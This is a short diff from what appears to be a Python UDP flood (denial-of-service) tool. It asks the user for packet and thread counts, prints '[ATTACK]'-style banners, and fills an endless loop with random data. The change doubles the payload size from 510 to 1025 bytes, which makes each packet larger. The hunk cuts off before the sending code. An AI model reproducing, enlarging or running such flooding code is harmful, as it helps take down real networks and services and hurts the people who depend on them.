@@ -22,7 +22,7 @@ choice = "y",
 times = int(input(" \033[1;32;40mPackets per connection\033[1;34;40m(\033[1;31;40m50\033[1;34;40m-\033[1;31;40m1000\033[1;34;40m): \033[0m"))
 threads = int(input(" \033[1;32;40mThreads\033[1;34;40m(\033[1;31;40m100\033[1;34;40m-\033[1;31;40m1000\033[1;34;40m): \033[0m"))
 def run():
-	data = random._urandom(510)
+	data = random._urandom(1025)
 	i = random.choice(("\033[1;34;40m[\033[1;31;40mHYPERUDP\033[1;34;40m]","\033[1;34;40m[\033[1;32;40mWACHIRA\033[1;34;40m]","\033[1;34;40m[\033[1;33;40mATTACK\033[1;34;40m]"))
 	while True:
 		try:
